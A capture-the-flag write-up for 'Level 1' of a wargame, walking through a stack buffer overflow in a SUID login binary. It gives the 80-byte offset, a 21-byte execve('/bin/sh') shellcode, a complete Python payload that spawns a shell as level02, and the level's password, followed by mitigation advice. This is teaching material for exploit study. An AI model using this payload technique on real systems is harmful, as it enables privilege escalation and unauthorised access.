# Level 1 - Stack-Based Buffer Overflow

## Overview

This level demonstrates a **Stack-Based Buffer Overflow** vulnerability where shellcode injection is required to exploit the binary. Unlike level0, there's no call to `/bin/sh` in the program, and we must inject our own shellcode to spawn a shell.

## Vulnerability: Stack-Based Buffer Overflow [CWE-121](https://cwe.mitre.org/data/definitions/121.html)

### Description

A stack-based buffer overflow occurs when a program writes more data to a buffer located on the stack than it can hold. This corrupts adjacent memory, potentially overwriting:

- Local variables
- Saved frame pointers
- Return addresses
- Function parameters

When the return address is overwritten with a controlled value, an attacker can redirect program execution to arbitrary code, including injected shellcode.

### Key Characteristics

- **NX bit disabled**: Stack memory is executable, allowing shellcode execution
- **No hardening**: No stack canaries or ASLR in this environment
- **Predictable addresses**: Global variables have fixed addresses

## Analysis

### Initial Reconnaissance

```bash
level01@OverRide:~$ ls -la
-rwsr-s---+ 1 level02 users 7360 Sep 10  2016 level01
```

The binary has SUID bit set, running with `level02` privileges.

### Reverse Engineering

Examining the binary reveals two `fgets()` calls:

```c
fgets(a_user_name, 0x100, stdin)  // Global variable - 256 bytes, SAFE
fgets(password, 0x64, stdin)      // Local buffer - reads 100 bytes, VULNERABLE
```

The first `fgets()` is secure, reading 256 bytes into a global buffer with sufficient space. The program checks if the username starts with "dat_wil" using `strncmp()`.

The second `fgets()` reads **100 bytes (0x64)** into a local stack buffer that has **less than 100 bytes** of available space, creating an overflow condition.

### Finding the Offset

With ([Wiremask Pattern Generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)):

```bash
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
A6*80Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
nope, incorrect password...

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```

Searching for `0x37634136` in the pattern reveals: **Offset = 80 bytes**

### Shellcode Strategy

Since NX is disabled and we have a large global buffer, we can:

1. Place shellcode in the username buffer (after "dat_wil")
2. Fill password buffer with padding (80 bytes)
3. Overwrite return address with address of shellcode

**Global buffer address**: `0x0804a040`
**Shellcode address**: `0x0804a040 + 7` = `0x0804a047` (accounting for "dat_wil")

### Shellcode Selection

Using a 21-byte execve shellcode from [https://shell-storm.org/shellcode/files/shellcode-575.html](https://shell-storm.org/shellcode/files/shellcode-575.html):

```asm
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

This shellcode executes: `execve("/bin/sh", NULL, NULL)`

## Exploitation

### Building the Payload

The exploit requires two inputs:

**Input 1 (Username):**
```
"dat_wil" + [shellcode]
```

**Input 2 (Password):**
```
[80 bytes padding] + [return address: 0x0804a047]
```

### Method 1: Python Payload

```bash
(python -c "print('dat_wil' + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + '\n' + 'A'*80 + '\x08\x04\xa0\x47'[::-1])" ; cat -) | ./level01
```

**Explanation:**
- `'dat_wil'` - Valid username prefix
- Shellcode bytes after username
- `\n` - Newline to submit username
- 80 bytes of padding
- `'\x08\x04\xa0\x47'[::-1]` - Return address in little-endian (reversed)
- `cat -` keeps stdin open to interact with spawned shell

### Execution

```bash
(python -c "print('dat_wil' + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + '\n' + 'A'*80 + '\x08\x04\xa0\x47'[::-1])" ; cat -) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

## Solution

### For Developers - How to Prevent This

1. **Always validate buffer sizes**:
   ```c
   // Bad - Size parameter exceeds buffer capacity
   char buffer[64];
   fgets(buffer, 100, stdin);

   // Good - Size matches buffer capacity
   char buffer[64];
   fgets(buffer, sizeof(buffer), stdin);
   ```

2. **Use safe string functions**:
   - `fgets()` with correct size
   - `strncpy()` instead of `strcpy()`
   - `snprintf()` instead of `sprintf()`

3. **Enable modern protections**:
   - **Stack Canaries** (`-fstack-protector-all`)
   - **NX bit** (non-executable stack)
   - **ASLR** (Address Space Layout Randomization)
   - **PIE** (Position Independent Executable)

## Key Takeaways

- Buffer overflow remains one of the most common vulnerabilities
- NX disabled + predictable addresses = ideal shellcode injection scenario
- Global variables have fixed addresses, making them reliable shellcode storage
- Proper bounds checking is critical for all buffer operations
- Modern protections (ASLR, NX, canaries) make exploitation significantly harder
- Defense in depth: multiple security layers prevent single-point failures

## Password

```
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```
